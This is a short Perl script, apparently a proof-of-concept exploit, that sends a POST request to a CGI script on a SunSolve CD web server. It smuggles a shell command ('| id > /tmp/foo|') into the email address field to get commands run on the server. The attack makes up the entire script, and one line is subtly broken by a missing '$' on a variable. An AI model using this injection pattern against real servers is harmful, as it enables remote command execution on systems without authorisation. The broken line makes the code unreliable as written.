#!/usr/bin/perl
use LWP::UserAgent;
use HTTP::Request::Common qw(POST);
ua = new LWP::UserAgent;
$ua->agent("Scrapers");
my $req = POST  'http://sunsolveCD.box.com:8383/cd-cgi/sscd_suncourier.pl',
[
step =>  "submit" ,
emailaddr => "foo\@bar.com| id > /tmp/foo|"];
$res = $ua->request($req);
print $res->as_string;
print "code", $res->code, "\n";
